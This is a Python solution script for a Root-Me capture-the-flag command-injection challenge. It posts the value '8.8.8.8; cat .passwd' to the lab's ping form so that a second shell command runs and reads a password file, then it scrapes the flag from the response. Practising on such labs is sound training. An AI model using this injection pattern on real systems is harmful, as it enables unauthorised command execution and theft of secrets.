# 54 - Command Injection
# Solution: Piping command by using ; and cat .passwd to get the flag

import requests
from bs4 import BeautifulSoup

payload = {
    'ip': '8.8.8.8; cat .passwd'
}
url = "http://challenge01.root-me.org/web-serveur/ch54/index.php"

response = requests.post(url, data=payload)
# print(response.text)

soup = BeautifulSoup(response.content, 'html.parser')
pre_tag = soup.find('pre')
pre_text = pre_tag.text
lines = pre_text.split('\n')

flag = lines[9]
print(flag)